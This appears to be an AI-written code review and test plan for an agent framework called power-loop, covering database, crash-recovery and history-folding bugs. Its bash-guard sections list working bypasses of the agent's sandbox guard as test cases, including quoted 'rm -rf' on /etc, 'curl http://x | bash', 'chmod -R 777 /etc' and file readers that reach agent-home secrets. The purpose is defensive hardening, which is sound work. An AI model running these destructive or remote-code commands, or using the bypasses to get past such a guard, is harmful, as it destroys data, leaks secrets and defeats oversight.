- tests/unit/test_bash_guards.py::test_scope_blocks_write_under_home [wrong-regime] — Only tests `echo x > <HOME>/notes.txt`. The WRITE hint list (' >','>>',' tee ',' sed -i',' rm ',' mv ',' cp ',' touch ',' mkdir ') omits common writers: `python -c open(...,'w')`, `dd of=<HOME>/x`, `truncate -s0 <HOME>/x`, `install`, `ln -s`, `chmod`, `chown`. Each writes/alters home but returns None. The space-padding (' >') also means a write with no leading space before the redirect or a heredoc can slip through. Test gives false confidence the write-side is sealed. → Parametrize writers outside the hint list: [f'python -c "open(\'{HOME}/x\',\'w\')"', f'dd of={HOME}/x if=/dev/zero count=1', f'truncate -s 0 {HOME}/x', f'install /etc/hosts {HOME}/x', f'ln -s /etc/passwd {HOME}/link'] and assert each is blocked. The fix this drives: validate the resolved target path under home, not the verb.
- tests/unit/test_bash_guards.py::test_dangerous_commands_are_blocked [wrong-regime] — The curated list is exactly the set the regex/tokenizer catches; it is silent on the inputs it MISSES. I verified live that `rm -rf "/etc"` (quoted target), `rm -rf ${HOME}/.ssh` (brace-expansion form), `chmod -R 777 /etc`, and `curl http://x | bash` (remote code exec) ALL return None. The test specifically includes `rm -rf $HOME/.ssh` and `rm -rf /etc` (which pass) but not the quoted/brace variants (which fail), so it reads as 'rm of system/home is blocked' when it is bypassable with a quote or a brace. → Add the bypass variants to the BLOCKED parametrize set so they must be caught: 'rm -rf "/etc"', "rm -rf '/etc'", 'rm -rf ${HOME}', 'rm -rf ${HOME}/.ssh', 'chmod -R 777 /etc'. Forces the guard to normalize quotes/brace-expansion (or, better, tokenize+resolve) instead of regex-matching raw text.
- tests/unit/test_timers.py::test_current_time_tool [asserts-nothing-real] — Asserts only res.status=='completed' and res.tool_calls==1. It never checks the tool RETURNED a time, the format, or that the value reached the model — a current_time handler that returns '' or raises-and-is-swallowed (still counted as a call) would pass. It proves the tool is registered and invoked, nothing about its output correctness. → Capture the tool message: rows=[m for m in await loop.get_messages(sid) if m['role']=='tool']; assert rows and a parseable ISO timestamp / year in rows[0]['content'] (e.g. assert re.search(r'20\d\d', str(rows[0]['content']))), proving the actual time value was produced and delivered.

Gaps:
- Bash scope guard write-path: NO test for writers outside the hint list (python file-open, dd of=, truncate, install, ln -s, chmod/chown under POWER_LOOP_HOME). The only write test is `echo > file`. Confirmed live that `cp ... /tmp` is caught but `python -c open(..,'w')` and `dd of=<HOME>/x` are not.
- Bash scope guard read-path: NO test for readers outside the 7-entry READ hint list. Confirmed `python`, `awk`, `sed`, `xxd`, `od`, `sort`, `strings` all read agent-home internals undetected — a real data-exfiltration hole with zero test coverage.
- _dangerous_command_reason quoting/expansion: NO test that quoted ('rm -rf "/etc"') or brace-expanded ('rm -rf ${HOME}') destructive targets are blocked; both currently bypass and are untested. Also no test for remote-code-exec patterns (curl|bash, wget|sh) which the guard does not even attempt to block.
- Ordering of scope-guard vs dangerous-command check vs actual execution in run_bash/run_background: tests exercise the predicates in isolation but there is no test asserting that run_bash REFUSES (returns the error string and does NOT execute) when the guard trips — only background_run's backend routing is end-to-end tested. A regression that calls the guard but ignores its return value would pass every existing guard test.
- test_byo_tools loads examples/42 at IMPORT time (module-level `byo = _load_byo()`) and mutates sys.path; if the example file is broken the whole module errors at collection rather than as a clean test failure, and the path insertion is never cleaned up (cross-test contamination risk). Not a correctness gap in product code but a brittleness gap in the suite.
- TimerRunner concurrency: no test that two TimerRunner instances / two scan_once calls racing the same due timer fire it exactly once (the CAS transition_timer armed->firing is the guard, exercised only single-runner). The slow-delivery double-fire test covers the stale-reclaim race but not two live scanners.


## Synthesis (fix order + test plan)

I have enough detail in the provided review to consolidate without re-reading the codebase. The findings are already adversarially verified with line numbers and repros. Let me produce the report directly.

# Power-Loop Deep Review — Actionable Consolidation

## (1) Confirmed Bug List (severity-sorted, deduped)

| # | Sev | Bug | One-line fix |
|---|-----|-----|--------------|
| B1 | HIGH | **PG `_column_exists` is cross-schema** — v1→v2 `send_index` ALTER skipped when same-named `pl_messages` exists in another schema, then v2 stamped → every `append_message` crashes (`schema.py:245-252`). | Scope the PG branch with `AND table_schema = current_schema()` to mirror `_table_exists`/MySQL. |
| B2 | HIGH | **Workflow wake-guard RMW not atomic** — bare get→set bypasses journal `mutate_runtime_state`, clobbering concurrent resume/`record_step` and double-waking (`workflow/runner.py:252-263`). | Route `make_wake_guard` through `store.mutate_runtime_state` (set `woke=True`, return SKIP if already woke). |
| B3 | HIGH | **`abort_pending` doesn't prime `sink._tool_calls`** — crash mid-abort with 2+ parallel tool_calls persists `{tool_call_ids:[b], tool_calls:[]}`; recovery permanently strands the session (`stateful_loop.py:774-793` + `sink.py:170-180`). | Add `sink._tool_calls = list(tool_calls)` in `abort_pending` after the `_assistant_seq` line. |
| B4 | HIGH | **Projection migration soft-fail with pre-existing `compact_note`** — fold timeout falls to note-only branch that writes a compact claiming `to_send` covering the unmerged fold sends → permanent silent context loss, marker set so never retried (`stateful_loop.py:1514-1522`). | On fold soft-fail during migration: don't set the marker (retry next send), OR write standalone-note compact with `to_send=0` (claim no range). |
| B5 | MED | **`_execute_pending` early-returns on empty `tool_calls`** — no `tool_call_ids` fallback (unlike `abort_pending`), so `resume()` can't self-heal a `tool_call_ids`-only pending; returns `completed` but pending stuck (`stateful_loop.py:1059-1061`). | Fall back to reconstruct from `pending['tool_call_ids']` (as `_prime_sink_from_pending` does), or clear pending if it can't act. |
| B6 | MED | **POWER_LOOP_HOME bash guard bypassable** — only blocks ~9 hardcoded read/write hints; `awk`/`base64`/`od`/`python`/`dd of=`/`truncate`/`ln -s` reach agent-home undetected (`default_tools.py:261-313`). | Validate the *resolved target path* under home (FS-layer), not the command verb; same for `_dangerous_command_reason` (normalize quotes/brace-expansion). |
| B7 | MED | **Legacy `IdentityProjector` mis-routed to projection-fold path** — no `kind` attr → treated as projection rep → folds (despite "never fold") and its `render([compact])` returns `[]` → silently drops all folded history (`types.py:223` + `history_projector.py:171-204`). | Give `IdentityProjector` `kind='verbatim'` (routes to safe in-place path) AND make its `render` handle `kind=='compact'`. |
| B8 | MED | **Verbatim `keep_last_sends` applied as `keep_last_n` (per user-message)** — follow-ups split one logical send across the fold boundary; under-keeps vs documented send semantics (`types.py:251-258` + `compact.py:253-271`). | Make the verbatim keep unit count *sends* (group by `send_index`), not `role=='user'` rows. |
| B9 | MED | **`recall_send` unusable under `ProjectedRepresentation`** — render emits no `#N` send-index labels but tool docstring/manifest tell the model to use "the #N the summary shows" (`representation.py:262-291`). | Re-emit per-send `#{send_index}` markers in `render`/compact summary (or update the tool contract to a discoverable index). |
| B10 | LOW | **Legacy `keep_last_sends=0` coerced to 4** by `0 or 4` in fold seeder (`types.py:38-40`). | Map `keep_last_sends=0` → never-fold fold_strategy (the path already short-circuits on `keep<=0`); drop the `or 4`. |
| B11 | LOW | **Projection→verbatim degrade renders full uncompacted log** — ignores existing projection compact + per-send rows; over budget (`stateful_loop.py:1183/1237/1313`). | Degrade path should still read the projection compact + after-cursor rows when present. |
| B12 | LOW | **resume()-before-send persists `send_index=NULL` rows** — later classified as uncompactable legacy prefix forever (`stateful_loop.py:675-700` + `1029-1031`). | Reject resume-before-send, or allocate a `send_index` on that path. |
| B13 | LOW | **Migration fails to compress folded sends on fold soft-fail (no `compact_note` case)** — missing `else` when `folded is None and note is None`; marker still set, never retries (`stateful_loop.py:1500-1534`). Same root pattern as B4. | Add the `else`: write a fallback compact OR leave the marker unset so it retries. (Fix alongside B4.) |
| B14 | LOW | **Verbatim-fallback prefix maps real seqs to `None` in `hist_seqs`** — durable history-repair can't deactivate an orphan there; re-dropped every send (`stateful_loop.py:1294-1311`). | Emit real per-row seqs for verbatim-fallback sends (keep `None` only for projector-rendered sends). |
| B15 | LOW | **`write_send_projection_rows` leaks stale-kind row on cross-rep re-finalize** — no other-kind cleanup at `send_index` (`store.py:609-642`). *Latent: no reachable trigger today.* | Add DELETE-at-`send_index` (delete-then-insert) like `commit_projection_fold`/`write_projection_migration`. |
| B16 | LOW | **`background_tasks` index name differs on MySQL** (`idx_bgtasks_...` vs `idx_background_tasks_...`) — cosmetic, no runtime break (`dialect.py:359`). | Rename MySQL index to the canonical `{p}idx_background_tasks_session_status`. |

**Flagged for re-check (doubtful on second read):**
- **B15** — verified at store level but the reviewer confirmed *no reachable trigger in the loop today* (verbatim mode never enters the projection write path). Treat as defensive hardening, not a live bug. Don't prioritize.
- **B11 trigger #1 is refuted** (factual misread of `send_index` durability); only trigger #2 (dual compact + `migrate_history_on_switch=False`) reproduces, and needs non-default config. Real but very narrow.
- **B1 exposure** — code defect + crash are unambiguous, but power-loop ships no PG multi-schema/`search_path` model. The crash is real *if an operator configures shared-prefix schemas via search_path*. Fix is one line and harmless, so keep it HIGH-priority-to-fix but note real-world exposure is medium.

**B4 and B13 are the same root cause** (migration fold soft-fail mishandling) — fix together.

---

## (2) Highest-Value Test Changes

### Delete / replace (stale — test removed/dead code, give false confidence)
- **`test_history_projector.py::{test_default_compact_folds_sends, test_default_compact_rolls_prior_compact_forward, test_compact_bounded_by_max_compact_chars}`** — test dead `.compact()` (no live caller post-3.0). Delete; live equivalents exist in `test_representation_fold.py`/`test_fold_loop_integration.py`.
- **`test_session_store_read_pool.py`** (whole file) — tests `read_pool_size`, a feature only on the dead legacy sync store. Delete or port intent to the async store.
- **`test_session_store_migrations.py::test_migrations_ladder_is_consistent`** + PRAGMA cases — guards the wrong (legacy) version registry; a forgotten `CURRENT_SCHEMA_VERSION` bump in `runtime.store.schema` is *not* caught. Replace with an async-store ladder test.
- **`test_session_store_export.py::test_export_import_round_trip`** — legacy-only, predates `send_index`. Retire; `test_project_messages_store::test_export_import_preserves_send_index` is canonical.
- **`test_session_store.py::test_concurrent_appends_get_distinct_seqs`** — RLock sync store; the real race is async FOR UPDATE. Redundant, delete.

### Fix (wrong-regime / asserts-nothing)
- **All loop fold tests using `max_tokens=10/1`** (`test_projection_compaction_keeps_last_n`, `test_projection_loop_runs_real_llm_summary_fold`) — threshold ≈0 so fold *always* fires; the token gate is never tested in its gating regime. Add realistic `max_tokens` (8000) and assert **NO fold below threshold, fold above**.
- **`test_bash_guards.py::{test_scope_blocks_read_of_home_internals, test_scope_blocks_write_under_home, test_dangerous_commands_are_blocked}`** — only test the inputs the guard catches. Parametrize over the *bypasses* (`awk/od/python/dd of=/truncate/ln -s`, quoted/brace-expanded `rm -rf "/etc"`/`${HOME}`). **These would have caught B6.**
- **`test_representation_fold.py::test_projection_project_send_and_render`** — only one perfectly-paired tool call. Add: missing-result→`<missing>`, duplicate `tool_call_id` FIFO, `project` hook dict-merge + exception-fallback.
- **`test_*::test_two_loops_real_fold_no_double_compact`** + `test_event_bus_async`/`test_current_time_tool` — assert behavior not private internals / sequential ordering. Make genuinely concurrent (`asyncio.gather`) or delete as redundant.

### New regression tests (prioritized — would have caught the confirmed bugs)
1. **B1**: Real PG two-schema test — provision v2 in schema A, hand-build v1 (no `send_index`) in schema B, open B with AUTO_CREATE/`search_path=b`; assert `b.pl_messages` has `send_index` and `append_message` succeeds.
2. **B3 + B5**: Persist crashed pending `{tool_call_ids:[b], tool_calls:[]}`, call `resume(sid)`; assert `get_pending(sid) is None` and a tool result row for `b` exists.
3. **B2**: `asyncio.gather(make_wake_guard(store)(ctx), journal.update(..., status=running, attempts=2))` on the yielding async store; assert final journal is `running/attempts=2/woke=True` (both orderings).
4. **B4 + B13**: Migrate a session (one with `compact_note`+>keep foldable sends, one without) with a fold stub returning `None`; assert either a compact covers the folded sends OR the `projection_migrated` marker is unset (retries).
5. **B7 + B10**: `AgentLoopConfig(history_projector=IdentityProjector()).projection_representation is None`; drive >keep sends past threshold, assert folded content still rendered; assert `keep_last_sends=0` maps to never-fold.
6. **B8**: Verbatim history, latest send = main user row + 2 follow-ups, `keep_last_sends=2`; assert fold boundary never splits a send (kept tail includes the original user row).
7. **Async-store gaps**: generalize the v1→k→CURRENT ladder round-trip; `older_than_ms` retention branch with deterministic time; `write_projection_migration` atomicity/marker; `deactivate_messages` (dropped not in `load_active`, auditable in `load_all`).
8. **B6 ordering**: assert `run_bash` *refuses and does not execute* when the guard trips (not just that the predicate returns an error).

---

## (3) Recommended Fix Order

**Tier 1 — crash / silent permanent data loss (do first):**
1. **B1** (one-line `current_schema()` scope) — hard crash on every append; trivial fix + add PG test.
2. **B3 + B5** together — session strand recovery; fix `abort_pending` priming *and* `_execute_pending` fallback (the latter heals already-stranded sessions).
3. **B4 + B13** together — migration fold soft-fail (shared root); abort-without-marker on soft-fail.
4. **B2** — route wake-guard through `mutate_runtime_state`; add concurrent regression.

**Tier 2 — security + projection correctness:**
5. **B6** — bash guard FS-layer validation (security; harden tests with bypass cases).
6. **B7 + B10** — `IdentityProjector` kind + render + keep mapping (one diff).
7. **B8** — verbatim keep-unit = sends.
8. **B9** — `#N` labels for `recall_send` discoverability.

**Tier 3 — low-severity / latent:**
9. **B11, B12, B14** — projection degrade/NULL-prefix/seq-mapping edge cases.
10. **B16** — MySQL index rename (cosmetic).
11. **B15** — defensive DELETE-at-`send_index`; *only if cheap* (no live trigger).

**Test cleanup** (delete stale legacy-store/history_projector suites + fix `max_tokens=10` regime + bash-guard parametrization) should land **alongside Tier 1–2**, since several stale suites are actively masking the bugs being fixed (the `max_tokens=10` tests mask B-class fold-gating regressions; the bash-guard tests mask B6).
